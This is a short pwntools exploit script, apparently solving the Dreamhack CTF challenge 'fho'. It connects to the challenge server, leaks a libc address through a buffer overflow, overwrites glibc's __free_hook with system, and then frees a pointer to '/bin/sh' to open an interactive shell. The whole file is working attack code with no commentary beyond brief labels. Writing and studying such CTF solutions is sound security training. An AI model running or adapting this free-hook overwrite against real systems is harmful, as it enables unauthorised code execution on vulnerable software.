#!/usr/bin/python3

from pwn import *

p = remote("host1.dreamhack.games", 10300)
e = ELF("./fho")

padding = "A".encode('utf-8') * 0x47 + "C".encode('utf-8')
mainRet = 0x21b10 + 231
__free_hook = 0x00000000003ed8e8
systemOffset = 0x04f550
binshOffset = 0x1b3e1a

# Leak libc
p.sendafter(": ", padding)
p.recvuntil("AC")
libc = u64(p.recvline().strip(b"\n").ljust(8, b"\x00")) - mainRet
log.info("libc: " + hex(libc))

# Spoof __free_hook
p.sendlineafter(": ", str(libc + __free_hook))
sleep(0.1)
p.sendlineafter(": ", str(libc + systemOffset))

# call free
p.sendlineafter(": ", str(libc + binshOffset))

p.interactive()
